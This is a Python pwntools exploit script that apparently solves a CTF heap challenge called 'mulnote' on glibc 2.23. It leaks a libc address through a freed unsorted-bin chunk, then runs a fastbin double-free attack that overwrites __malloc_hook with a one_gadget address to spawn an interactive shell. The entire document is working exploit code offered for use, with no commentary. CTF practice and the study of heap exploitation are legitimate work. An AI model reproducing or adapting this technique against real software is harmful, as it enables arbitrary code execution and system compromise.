import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./mulnote')
	elf=ELF('./mulnote')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else :
	io=remote('',)
	elf=ELF('./mulnote')
	libc=ELF('./libc.so')

def add(a,b):
	io.sendlineafter('>','C')
	io.sendlineafter('size>',str(a))
	io.sendafter('note>',b)

def show():
	io.sendlineafter('>','S')


def edit(a,b):
	io.sendlineafter('>','E')
	io.sendlineafter('index>',str(a))
	io.sendafter('note>',b)

def delete(a):
	io.sendlineafter('>','R')
	io.sendlineafter('index>',str(a))

add(0x60,'aaaa')
add(0x60,'aaaa')
add(0x80,'bbbb')
add(0x20,'cccc')

delete(2)

show()

io.recvuntil('\x32\x5d\x3a\x0a')
__malloc_hook_addr=u64(io.recv(6)+'\x00\x00')-88-0x10
libc.address=__malloc_hook_addr-libc.sym['__malloc_hook']
success('libc_base:'+hex(libc.address))


delete(1)
delete(0)
delete(1)

add(0x60,p64(__malloc_hook_addr-0x23))
add(0x60,'a')
add(0x60,'a')
add(0x60,'a'*0x13+p64(libc.address+0x4526a))







#gdb.attach(io)
#pause()
io.interactive()